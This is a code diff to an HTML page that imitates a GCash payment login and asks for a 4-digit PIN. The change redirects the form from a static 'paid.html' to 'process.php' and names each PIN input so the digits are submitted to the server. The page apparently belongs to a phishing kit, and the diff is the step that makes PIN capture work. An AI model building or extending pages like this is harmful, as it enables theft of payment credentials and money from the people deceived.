@@ -119,15 +119,15 @@
             <p><strong>Login to pay with GCash</strong></p>
             
             <span class="m-num">Enter your 4-digit pin code</span>
-            <form action="paid.html">
+            <form action="process.php">
                 <div class="pin-container">
-                    <input class="pin-input" type="password" maxlength="1" onkeypress="return isNumberKey(event)" onkeyup="handleChange(this, 1, event)" required>
+                    <input class="pin-input" name="pin1" type="password" maxlength="1" onkeypress="return isNumberKey(event)" onkeyup="handleChange(this, 1, event)" required>
                   
-                    <input class="pin-input" type="password" maxlength="1" onkeypress="return isNumberKey(event)" onkeyup="handleChange(this, 2, event)" required>
+                    <input class="pin-input" name="pin2" type="password" maxlength="1" onkeypress="return isNumberKey(event)" onkeyup="handleChange(this, 2, event)" required>
                   
-                    <input class="pin-input" type="password" maxlength="1" onkeypress="return isNumberKey(event)" onkeyup="handleChange(this, 3, event)" required>
+                    <input class="pin-input" name="pin3" type="password" maxlength="1" onkeypress="return isNumberKey(event)" onkeyup="handleChange(this, 3, event)" required>
                   
-                    <input class="pin-input" type="password" maxlength="1" onkeypress="return isNumberKey(event)" onkeyup="handleChange(this, 4, event)" required>
+                    <input class="pin-input" name="pin4" type="password" maxlength="1" onkeypress="return isNumberKey(event)" onkeyup="handleChange(this, 4, event)" required>
                 </div>
     
                 <div class="mt-3 text-center">
